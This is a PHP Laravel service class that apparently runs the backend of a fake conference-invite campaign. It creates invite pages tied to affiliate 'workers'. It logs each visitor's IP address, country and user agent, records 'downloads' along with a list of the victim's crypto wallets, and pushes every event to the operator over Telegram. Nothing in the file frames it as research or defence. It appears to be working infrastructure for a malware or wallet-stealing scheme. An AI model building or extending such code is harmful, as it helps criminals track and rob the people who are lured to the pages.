<?php

namespace App\Services;

use App\Models\InvitePage;
use App\Models\Visit;
use App\Models\Download;
use App\Models\Conference;
use App\Models\Worker;
use App\Services\TelegramService;
use App\Helpers\IpHelper;
use Illuminate\Support\Str;

class InvitePageService
{
    public function __construct(
        private TelegramService $telegramService
    ) {}

    public function create(array $data, string $workerToken): array
    {
        $worker = Worker::where('tag', $workerToken)
            ->where('is_active', true)
            ->firstOrFail();

        $ref = $data['ref'] ?? strtoupper(substr(md5(uniqid(mt_rand(), true)), 0, 10));

        $conference = Conference::create([
            'title' => $data['title'],
            'invite_code' => $this->generateInviteCode(),
            'worker_tag' => $worker->tag,
            'worker_id' => $worker->id,
            'is_active' => true
        ]);

        $page = InvitePage::create([
            'title' => $data['title'],
            'ref' => $ref,
            'conference_id' => $conference->id,
            'worker_tag' => $worker->tag,
            'is_active' => true
        ]);

        return [
            'id' => $page->id,
            'title' => $page->title,
            'ref' => $page->ref,
            'conference_id' => $page->conference_id,
            'worker_tag' => $page->worker_tag,
            'created_at' => $page->created_at->toISOString()
        ];
    }

    public function getByRef(string $ref): ?array
    {
        $invitePage = InvitePage::where('ref', $ref)
            ->where('is_active', true)
            ->with('conference')
            ->first();

        if (!$invitePage) {
            return null;
        }

        return [
            'id' => $invitePage->id,
            'conference_id' => $invitePage->conference_id,
            'ref' => $invitePage->ref,
            'title' => $invitePage->title
        ];
    }

    public function getWorkerTag(string $ref): ?string
    {
        $invitePage = InvitePage::where('ref', $ref)
            ->where('is_active', true)
            ->first();

        return $invitePage?->worker_tag;
    }

    public function recordVisit(string $ref): bool
    {
        $invitePage = InvitePage::where('ref', $ref)
            ->where('is_active', true)
            ->firstOrFail();

        $realIp = IpHelper::getRealIp();
        $countryInfo = IpHelper::getCountryInfo($realIp);
        
        Visit::create([
            'type' => 'invite_page',
            'reference_id' => $ref,
            'ip_address' => $realIp,
            'user_agent' => request()->userAgent(),
            'country' => $countryInfo['country'],
            'country_code' => $countryInfo['country_code'],
            'flag' => $countryInfo['flag']
        ]);

        $this->telegramService->notifyPageVisit(
            'invite_page',
            $ref,
            $realIp,
            request()->userAgent(),
            $countryInfo
        );

        return true;
    }

    public function recordDownload(string $ref, array $data): bool
    {
        $invitePage = InvitePage::where('ref', $ref)
            ->where('is_active', true)
            ->firstOrFail();

        $realIp = IpHelper::getRealIp();
        $countryInfo = IpHelper::getCountryInfo($realIp);
        
        Download::create([
            'type' => 'invite_page',
            'reference_id' => $ref,
            'platform' => $data['platform'] ?? 'unknown',
            'tag' => $data['tag'] ?? null,
            'user_agent' => request()->userAgent(),
            'wallets' => $data['wallets'] ?? [],
            'ip_address' => $realIp,
            'country' => $countryInfo['country'],
            'country_code' => $countryInfo['country_code'],
            'flag' => $countryInfo['flag']
        ]);

        $this->telegramService->notifyDownload(
            'invite_page',
            $ref,
            $data['platform'] ?? 'unknown',
            $realIp,
            request()->userAgent(),
            $data['wallets'] ?? [],
            $countryInfo
        );

        return true;
    }

    public function getAllActive(): array
    {
        return InvitePage::where('is_active', true)
            ->get()
            ->map(function ($page) {
                return [
                    'id' => $page->id,
                    'title' => $page->title,
                    'ref' => $page->ref,
                    'conference_id' => $page->conference_id,
                    'worker_tag' => $page->worker_tag,
                    'created_at' => $page->created_at->toISOString()
                ];
            })
            ->toArray();
    }

    public function delete(int $id): bool
    {
        $page = InvitePage::find($id);
        
        if (!$page) {
            return false;
        }

        return $page->delete();
    }

    private function generateInviteCode(): string
    {
        return strtoupper(substr(md5(uniqid()), 0, 8));
    }
}
